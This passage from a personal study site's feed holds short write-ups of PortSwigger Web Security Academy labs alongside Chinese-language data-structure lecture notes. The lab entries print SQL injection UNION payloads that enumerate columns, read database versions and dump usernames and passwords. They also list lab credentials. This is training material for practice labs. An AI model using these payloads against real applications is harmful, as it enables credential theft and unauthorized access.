&lt;p>Loose Comparison Operator in &lt;code>PHP&lt;/code>&lt;/p></description></item><item><title>Lab: SQL injection attack, listing the database contents on non-Oracle databases :four:</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases-_four_/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases-_four_/</guid><description>&lt;h1 id="lab-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases-four">
 Lab: SQL injection attack, listing the database contents on non-Oracle databases :four:
 &lt;a class="anchor" href="#lab-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases-four">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-portswigger-web-security-academy-web">
 tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
&lt;/h6>
&lt;ul>
&lt;li>Description: This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application&amp;rsquo;s response so you can use a UNION attack to retrieve data from other tables.
The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.&lt;/li>
&lt;li>Goal: To solve the lab, log in as the administrator user.&lt;/li>
&lt;/ul>
&lt;h2 id="exp">
 Exp
 &lt;a class="anchor" href="#exp">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>Determine # of columns
Payload: &lt;code>?category=Gifts' union select NULL,NULL --&lt;/code>&lt;/p></description></item><item><title>Lab: SQL injection attack, listing the database contents on Oracle</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-listing-the-database-contents-on-oracle/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-listing-the-database-contents-on-oracle/</guid><description>&lt;h1 id="lab-sql-injection-attack-listing-the-database-contents-on-oracle">
 Lab: SQL injection attack, listing the database contents on Oracle
 &lt;a class="anchor" href="#lab-sql-injection-attack-listing-the-database-contents-on-oracle">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-portswigger-web-security-academy-web">
 tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
&lt;/h6>
&lt;ul>
&lt;li>Description: This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application&amp;rsquo;s response so you can use a UNION attack to retrieve data from other tables.
The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.&lt;/li>
&lt;li>Goal: To solve the lab, log in as the administrator user.&lt;/li>
&lt;li>Hint: There is a built-in table on Oracle called dual which you can use for this purpose. For example: &lt;code>UNION SELECT 'abc' FROM dual&lt;/code>&lt;/li>
&lt;/ul>
&lt;h2 id="exp">
 Exp
 &lt;a class="anchor" href="#exp">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>Determine # of columns
Payload: &lt;code>?category=Lifestyle' union select NULL,NULL from dual--&lt;/code>&lt;/p></description></item><item><title>Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft/</guid><description>&lt;h1 id="lab-sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft">
 Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
 &lt;a class="anchor" href="#lab-sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-portswigger-web-security-academy-web">
 tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
&lt;/h6>
&lt;ul>
&lt;li>Description: his lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.&lt;/li>
&lt;li>Goal: To solve the lab, display the database version string.&lt;/li>
&lt;/ul>
&lt;h2 id="exp">
 Exp
 &lt;a class="anchor" href="#exp">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>Consider # of column
Payload: &lt;code>?category=Accessories' union select NULL,NULL -- #&lt;/code>&lt;/li>
&lt;li>Consider column type
Payload: &lt;code>?category=Accessories' union select 'a','a' -- #&lt;/code>
Both of them contained text.&lt;/li>
&lt;li>Attack
Payload: &lt;code>?category=Accessories' union select 'abc',@@version -- #&lt;/code>
:::spoiler Success Screenshot
&lt;img src="https://i.imgur.com/vOx5kCK.png" alt="" />
:::&lt;/li>
&lt;/ol>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2></description></item><item><title>Lab: SQL injection attack, querying the database type and version on Oracle</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-querying-the-database-type-and-version-on-oracle/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-querying-the-database-type-and-version-on-oracle/</guid><description>&lt;h1 id="lab-sql-injection-attack-querying-the-database-type-and-version-on-oracle">
 Lab: SQL injection attack, querying the database type and version on Oracle
 &lt;a class="anchor" href="#lab-sql-injection-attack-querying-the-database-type-and-version-on-oracle">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-portswigger-web-security-academy-web">
 tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
&lt;/h6>
&lt;ul>
&lt;li>Description: This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.&lt;/li>
&lt;li>Our Goal: To solve the lab, display the database version string.&lt;/li>
&lt;/ul>
&lt;h2 id="exp---sqli-cheat-sheet---examining-the-database-in-sql-injection-attacks">
 Exp - &lt;a href="https://portswigger.net/web-security/sql-injection/examining-the-database">SQLi Cheat Sheet - Examining the database in SQL injection attacks&lt;/a>
 &lt;a class="anchor" href="#exp---sqli-cheat-sheet---examining-the-database-in-sql-injection-attacks">#&lt;/a>
&lt;/h2>
&lt;p>According to the cheat sheet above, we can use the command to fetch the version of this database, e.g.
&lt;img src="https://i.imgur.com/Qxtgz5u.png" alt="" />
:::warning
Before the recon, the hint told you that this database is created by &lt;code>Oracle&lt;/code>. So, you must contained &lt;code>From&lt;/code> preserved word in each query, e.g. &lt;code>SELECT 'abc' FROM dual&lt;/code>
:::&lt;/p></description></item><item><title>Lab: SQL injection UNION attack, determining the number of columns returned by the query</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query/</guid><description>&lt;h1 id="lab-sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query">
 Lab: SQL injection UNION attack, determining the number of columns returned by the query
 &lt;a class="anchor" href="#lab-sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-portswigger-web-security-academy-web">
 tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
&lt;/h6>
&lt;ul>
&lt;li>Description: This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application&amp;rsquo;s response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.&lt;/li>
&lt;li>Hint: To solve the lab, determine the number of columns returned by the query by performing a &lt;a href="https://portswigger.net/web-security/sql-injection/union-attacks">SQL injection UNION&lt;/a> attack that returns an additional row containing null values.&lt;/li>
&lt;/ul>
&lt;h4 id="exp">
 Exp
 &lt;a class="anchor" href="#exp">#&lt;/a>
&lt;/h4>
&lt;p>Payload: &lt;code>https://0ab2008b04e96b8f8057358e008d00d0.web-security-academy.net/filter?category=%27%20UNION%20SELECT%20NULL,NULL,NULL--&lt;/code>
:::spoiler Success Screenshot
&lt;img src="https://i.imgur.com/yZ3QPPF.png" alt="" />
:::&lt;/p></description></item><item><title>Lab: SQL injection UNION attack, finding a column containing text</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-finding-a-column-containing-text/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-finding-a-column-containing-text/</guid><description>&lt;h1 id="lab-sql-injection-union-attack-finding-a-column-containing-text">
 Lab: SQL injection UNION attack, finding a column containing text
 &lt;a class="anchor" href="#lab-sql-injection-union-attack-finding-a-column-containing-text">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-portswigger-web-security-academy-web">
 tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
&lt;/h6>
&lt;ul>
&lt;li>Description: This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application&amp;rsquo;s response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data.&lt;/li>
&lt;li>Hint: The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.&lt;/li>
&lt;/ul>
&lt;h2 id="exp">
 Exp
 &lt;a class="anchor" href="#exp">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>Determine how many columns it has
You can use the technique from previous question.
Payload: &lt;code>?category=' UNION SELECT NULL,NULL,NULL--&lt;/code>&lt;/p></description></item><item><title>Lab: SQL injection UNION attack, retrieving data from other tables</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-retrieving-data-from-other-tables/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-retrieving-data-from-other-tables/</guid><description>&lt;h1 id="lab-sql-injection-union-attack-retrieving-data-from-other-tables">
 Lab: SQL injection UNION attack, retrieving data from other tables
 &lt;a class="anchor" href="#lab-sql-injection-union-attack-retrieving-data-from-other-tables">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-portswigger-web-security-academy-web">
 tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
&lt;/h6>
&lt;ul>
&lt;li>Description: This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application&amp;rsquo;s response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.&lt;/li>
&lt;li>Hint: The database contains a different table called users, with columns called username and password.
To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.&lt;/li>
&lt;/ul>
&lt;h4 id="exp">
 Exp
 &lt;a class="anchor" href="#exp">#&lt;/a>
&lt;/h4>
&lt;ol>
&lt;li>Using all technique we learned before
According to union-based technique we learned before, we can consider there&amp;rsquo;re 2 columns in this database and both of them are text strings
Payload: &lt;code>?category=Lifestyle' UNION SELECT 'Title name','Post content'--&lt;/code>&lt;/li>
&lt;li>Find the detailed info in &lt;code>users&lt;/code> table
Payload: &lt;code>?category=Lifestyle' UNION SELECT username, password FROM users--&lt;/code>&lt;/li>
&lt;li>Login as administrator
Username: &lt;code>administrator&lt;/code>
Password: &lt;code>5kg73b7jinl9plif82d3&lt;/code>
:::spoiler Success Screenshot
&lt;img src="https://i.imgur.com/kiRM6bX.png" alt="" />
:::&lt;/li>
&lt;/ol>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2></description></item><item><title>Lab: SQL injection UNION attack, retrieving multiple values in a single column</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-retrieving-multiple-values-in-a-single-column/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-retrieving-multiple-values-in-a-single-column/</guid><description>&lt;h1 id="lab-sql-injection-union-attack-retrieving-multiple-values-in-a-single-column">
 Lab: SQL injection UNION attack, retrieving multiple values in a single column
 &lt;a class="anchor" href="#lab-sql-injection-union-attack-retrieving-multiple-values-in-a-single-column">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-portswigger-web-security-academy-web">
 tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
&lt;/h6>
&lt;ul>
&lt;li>Description: This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application&amp;rsquo;s response so you can use a UNION attack to retrieve data from other tables.&lt;/li>
&lt;li>Hint: The database contains a different table called users, with columns called username and password.
To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.&lt;/li>
&lt;/ul>
&lt;h2 id="exp">
 Exp
 &lt;a class="anchor" href="#exp">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>Consider how many columns in this table
Payload: &lt;code>?category=Lifestyle' UNION SELECT NULL,NULL--&lt;/code>&lt;/li>
&lt;li>Consider the type of each columns
Payload: &lt;code>?category=Lifestyle' UNION SELECT 1,'a'--&lt;/code>
As the payload above, the 1st column is number-based string, and 2nd column is text-based string.
:::spoiler Result
&lt;img src="https://i.imgur.com/9V0cYHD.png" alt="" />
:::&lt;/li>
&lt;li>&lt;font color="FF0000">通靈&lt;/font>: Find username and password
From the result above, there&amp;rsquo;s just one column is text-based string that we can inject, so we can use concatenate operator &lt;code>||&lt;/code> to concatenate two strings that we query together.
Payload: &lt;code>?category=Gifts' UNION SELECT NULL,username||'~'||password FROM users--&lt;/code>
:::spoiler Result
&lt;img src="https://i.imgur.com/d1zw9eY.png" alt="" />
:::&lt;/li>
&lt;li>Login by username and password that we fetch
:::spoiler Success Screenshot
&lt;img src="https://i.imgur.com/P9CLaQg.png" alt="" />
:::&lt;/li>
&lt;/ol>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2></description></item><item><title>Lab: Stored DOM XSS</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/xss/lab_-stored-dom-xss/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/xss/lab_-stored-dom-xss/</guid><description>&lt;h1 id="lab-stored-dom-xss">
 Lab: Stored DOM XSS
 &lt;a class="anchor" href="#lab-stored-dom-xss">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-portswigger-web-security-academy-web">
 tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
&lt;/h6>
&lt;ul>
&lt;li>Description: This lab demonstrates a stored DOM vulnerability in the blog comment functionality.&lt;/li>
&lt;li>Goal: To solve this lab, exploit this vulnerability to call the &lt;code>alert()&lt;/code> function.&lt;/li>
&lt;/ul>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>Find the injected place
According to the description, we know that the comment place of each post has some problems. So, we can try to inject something.&lt;/p></description></item><item><title>Lab: Using application functionality to exploit insecure deserialization</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/deserialization/lab_-using-application-functionality-to-exploit-insecure-deserialization/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/deserialization/lab_-using-application-functionality-to-exploit-insecure-deserialization/</guid><description>&lt;h1 id="lab-using-application-functionality-to-exploit-insecure-deserialization">
 Lab: Using application functionality to exploit insecure deserialization
 &lt;a class="anchor" href="#lab-using-application-functionality-to-exploit-insecure-deserialization">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-portswigger-web-security-academy-web">
 tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
&lt;/h6>
&lt;ul>
&lt;li>
&lt;p>Description: This lab uses a serialization-based session mechanism. A certain feature invokes a dangerous method on data provided in a serialized object.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Goal: To solve the lab, edit the serialized object in the session cookie and use it to delete the morale.txt file from Carlos&amp;rsquo;s home directory.&lt;/p>
&lt;p>You can log in to your own account using the following credentials: wiener:peter
You also have access to a backup account: gregg:rosebud&lt;/p></description></item><item><title>Lecture 10</title><link>https://bernie6401.github.io/docs/data-structure/lecture-10/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/data-structure/lecture-10/</guid><description>&lt;h1 id="lecture-10">
 Lecture 10
 &lt;a class="anchor" href="#lecture-10">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-data-structure-nycu">
 tags: &lt;code>Data Structure&lt;/code> &lt;code>NYCU&lt;/code>
 &lt;a class="anchor" href="#tags-data-structure-nycu">#&lt;/a>
&lt;/h6>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/zLuuRC56uvI">Lec10 資料結構 第六週課程&lt;/a>&lt;/p>
&lt;h2 id="rewind">
 Rewind
 &lt;a class="anchor" href="#rewind">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Stack / Queue也可以用link-list實作，所以兩者不能和array畫上等號，只能說兩者都是一種data structure，只是用不同方式implement而已
:::spoiler Implementation Example
&lt;img src="https://hackmd.io/_uploads/HkkCaFyUn.png" alt="" />
:::&lt;/li>
&lt;li>之前提到的多項式也可以用link-list實作，同樣也可以解決sparse的問題
:::spoiler Implementation Example
&lt;img src="https://hackmd.io/_uploads/r15haYyL2.png" alt="" />
:::&lt;/li>
&lt;li>Free pool的概念就是像glibc中那樣的回收場(Fast bin/Small bin/Large bin/Unsorted bin)&lt;/li>
&lt;/ul>
&lt;h3 id="equivalence-relations">
 Equivalence Relations
 &lt;a class="anchor" href="#equivalence-relations">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>A relation over a set, S, is said to be an equivalence relations over S iff it is symmetric, reflexive, and transitive over S.&lt;/p>
&lt;ul>
&lt;li>reflexive, x=x&lt;/li>
&lt;li>symmetric, if x=y, then y=x&lt;/li>
&lt;li>transitive, if x=y and y=z, then x=z&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>Example&lt;/p></description></item><item><title>Lecture 2</title><link>https://bernie6401.github.io/docs/data-structure/lecture-2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/data-structure/lecture-2/</guid><description>&lt;h1 id="lecture-2">
 Lecture 2
 &lt;a class="anchor" href="#lecture-2">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-data-structure-nycu">
 tags: &lt;code>Data Structure&lt;/code> &lt;code>NYCU&lt;/code>
 &lt;a class="anchor" href="#tags-data-structure-nycu">#&lt;/a>
&lt;/h6>
&lt;p>[TOC]&lt;/p>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/0J2eLvkuF8k">Lec02 資料結構 第二週課程&lt;/a>&lt;/p>
&lt;h2 id="note">
 Note
 &lt;a class="anchor" href="#note">#&lt;/a>
&lt;/h2>
&lt;h3 id="recursive-algorithms">
 Recursive Algorithms
 &lt;a class="anchor" href="#recursive-algorithms">#&lt;/a>
&lt;/h3>
&lt;h4 id="type">
 Type
 &lt;a class="anchor" href="#type">#&lt;/a>
&lt;/h4>
&lt;ul>
&lt;li>Direct Recursion: 簡單來說就是自己呼叫自己&lt;/li>
&lt;li>Indirect Recursion: A calls B $\to$ B calls itself&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h4 id="boundary-condition">
 Boundary Condition
 &lt;a class="anchor" href="#boundary-condition">#&lt;/a>
&lt;/h4>
&lt;p>Recursive algorithm是會停止的，如果他能夠寫出一個完整的通式或過程，就代表有上限，當達到這個上限時就會停止
:::spoiler Example
&lt;img src="https://i.imgur.com/5fDAGfc.png" alt="" />
:::&lt;/p>
&lt;hr>
&lt;h4 id="application-of-recursive-function">
 Application of Recursive Function
 &lt;a class="anchor" href="#application-of-recursive-function">#&lt;/a>
&lt;/h4>
&lt;ul>
&lt;li>
&lt;p>Permutation
Detailed description can browse the &lt;a href="https://youtu.be/0J2eLvkuF8k">original video&lt;/a>
如果不用Recursive解決Permutation的問題，可以考慮用For-Loop但是要考慮重複出現的問題
:::spoiler Example
&lt;img src="https://i.imgur.com/hGNBo0t.png" alt="" />&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/oU1sF0H.png" alt="" />
在這個例子中boundary condition就是只剩下一個字元需要做排列的時候
:::&lt;/p></description></item><item><title>Lecture 4</title><link>https://bernie6401.github.io/docs/data-structure/lecture-4/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/data-structure/lecture-4/</guid><description>&lt;h1 id="lecture-4">
 Lecture 4
 &lt;a class="anchor" href="#lecture-4">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-data-structure-nycu">
 tags: &lt;code>Data Structure&lt;/code> &lt;code>NYCU&lt;/code>
 &lt;a class="anchor" href="#tags-data-structure-nycu">#&lt;/a>
&lt;/h6>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/x72xBomc-XE">Lec04 資料結構 第三週課程&lt;/a>&lt;/p>
&lt;h2 id="note">
 Note
 &lt;a class="anchor" href="#note">#&lt;/a>
&lt;/h2>
&lt;h3 id="array">
 Array
 &lt;a class="anchor" href="#array">#&lt;/a>
&lt;/h3>
&lt;p>用array表達一個多項式 $\to$ e.g.:
$$
A(X)=3X^{20}+2X^{5}+4\
B(X)=X^{4}+10X^{3}+1
$$&lt;/p>
&lt;h4 id="type-1">
 Type 1
 &lt;a class="anchor" href="#type-1">#&lt;/a>
&lt;/h4>
&lt;p>多項式的係數就是Array中存放的element，而指數代表Array的index
&lt;img src="https://i.imgur.com/Wy5X9bx.png" alt="" />&lt;/p>
&lt;ul>
&lt;li>缺點：
如下圖的$A(X)$，如果有一個sparse的array，這樣開的空間就只會有兩個index有存放數值，其他就會被浪費掉
&lt;img src="https://i.imgur.com/SjZreKb.png" alt="" />&lt;/li>
&lt;/ul>
&lt;h4 id="type-2">
 Type 2
 &lt;a class="anchor" href="#type-2">#&lt;/a>
&lt;/h4>
&lt;blockquote>
&lt;p>老師表示回家自己看書&lt;/p>&lt;/blockquote>
&lt;h4 id="type-3">
 Type 3
 &lt;a class="anchor" href="#type-3">#&lt;/a>
&lt;/h4>
&lt;p>用一個global array存放所有的多項式，以上圖為例，global array存放$A(X)$和$B(X)$，存放index和相對應的coefficient
:::info
How to implement? Refer to original video at timestamp &lt;code>5:30&lt;/code>
:::
:::danger
如果Global Array滿了怎麼辦?最簡單的作法是看前面有無可回收的多項式(寫在Descrutor)
:::&lt;/p>
&lt;hr>
&lt;h3 id="matrix">
 Matrix
 &lt;a class="anchor" href="#matrix">#&lt;/a>
&lt;/h3>
&lt;p>最簡單的就是直接declare一個2-dim的陣列，存放矩陣的element，缺點也和上面提到的sparse array一樣會有sparse matrix，如果太多index沒有存放東西，就會很浪費&lt;/p></description></item><item><title>Lecture 6</title><link>https://bernie6401.github.io/docs/data-structure/lecture-6/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/data-structure/lecture-6/</guid><description>&lt;h1 id="lecture-6">
 Lecture 6
 &lt;a class="anchor" href="#lecture-6">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-data-structure-nycu">
 tags: &lt;code>Data Structure&lt;/code> &lt;code>NYCU&lt;/code>
 &lt;a class="anchor" href="#tags-data-structure-nycu">#&lt;/a>
&lt;/h6>
&lt;p>[TOC]&lt;/p>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/5HBMYNYYGZU">Lec06 資料結構 第四週課程&lt;/a>
&lt;a href="https://gist.github.com/LeeKLTW/e5004f2d7046d43676d0891af8a13ef7">[C/C++] C/C++ 箭頭(-&amp;gt;) 、點(.)、雙冒號(::) 用法&lt;/a>&lt;/p>
&lt;h2 id="rewind">
 Rewind
 &lt;a class="anchor" href="#rewind">#&lt;/a>
&lt;/h2>
&lt;h3 id="string-matching-task">
 String Matching Task
 &lt;a class="anchor" href="#string-matching-task">#&lt;/a>
&lt;/h3>
&lt;p>最笨的作法是一個字元依依比對
&lt;img src="https://i.imgur.com/qwCSoNe.png" alt="" />&lt;/p>
&lt;hr>
&lt;h3 id="kmp-algorithm">
 KMP Algorithm
 &lt;a class="anchor" href="#kmp-algorithm">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>有沒有可能一次不要只移動一個字元，
&lt;img src="https://i.imgur.com/zNhwzCt.png" alt="" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>又充分利用已經比對過的資訊進行位移
&lt;img src="https://i.imgur.com/7uvOfzP.png" alt="" />&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="原理">
 原理
 &lt;a class="anchor" href="#%e5%8e%9f%e7%90%86">#&lt;/a>
&lt;/h3>
&lt;p>運用到的就是建立一個Failure Function，如下圖為例，在index=5的地方failure function是3，代表從index=5往回看3個字元，會和整個字串的開頭往後看3個字元會相等
&lt;img src="https://i.imgur.com/k8auhgP.png" alt="" />&lt;/p>
&lt;p>這樣的話就可以快速的移動比對的字串，例如下圖，index i和j不相等，則可以往回看j-1的failure function儲存的相等字元有多少，如果是3代表可以直接移動到P到相等字元的地方(也就是p[3+1]的地方開始比對)，也就是粉紅色的地方對齊，這樣的話就可以移動不只一個字元
&lt;img src="https://i.imgur.com/vrO4YnO.png" alt="" />&lt;/p>
&lt;h3 id="implementation">
 Implementation
 &lt;a class="anchor" href="#implementation">#&lt;/a>
&lt;/h3>
&lt;p>:::info
Prefix (Failure) Function can refer to &lt;code>1:05:00&lt;/code>
KMP Matcher can refer to orignal video at timestamp &lt;code>1:14:00&lt;/code>
實際操作：&lt;code>1:14:10&lt;/code>
:::&lt;/p></description></item><item><title>Lecture 8</title><link>https://bernie6401.github.io/docs/data-structure/lecture-8/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/data-structure/lecture-8/</guid><description>&lt;h1 id="lecture-8">
 Lecture 8
 &lt;a class="anchor" href="#lecture-8">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-data-structure-nycu">
 tags: &lt;code>Data Structure&lt;/code> &lt;code>NYCU&lt;/code>
 &lt;a class="anchor" href="#tags-data-structure-nycu">#&lt;/a>
&lt;/h6>
&lt;h2 id="reference--background">
 Reference &amp;amp; Background
 &lt;a class="anchor" href="#reference--background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/lhXHk8IuFeQ">Lec08 資料結構 第五週課程&lt;/a>
&lt;a href="https://kopu.chat/c%E8%AA%9E%E8%A8%80-%E8%B6%85%E5%A5%BD%E6%87%82%E7%9A%84%E6%8C%87%E6%A8%99%EF%BC%8C%E5%88%9D%E5%AD%B8%E8%80%85%E8%AB%8B%E9%80%B2%EF%BD%9E/">C語言: 超好懂的指標，初學者請進～&lt;/a>&lt;/p>
&lt;h2 id="note">
 Note
 &lt;a class="anchor" href="#note">#&lt;/a>
&lt;/h2>
&lt;h3 id="rewind">
 Rewind
 &lt;a class="anchor" href="#rewind">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>Array
之前提到Array的結構，其缺點是大小是固定的，但有時候需要儲存的東西可能是動態改變的，且沒有用到的空間就會變成一種浪費&lt;/li>
&lt;li>Solution
此時就可能可以考慮用Link-List的結構處理這樣的資料&lt;/li>
&lt;/ul>
&lt;h3 id="link-list">
 Link-List
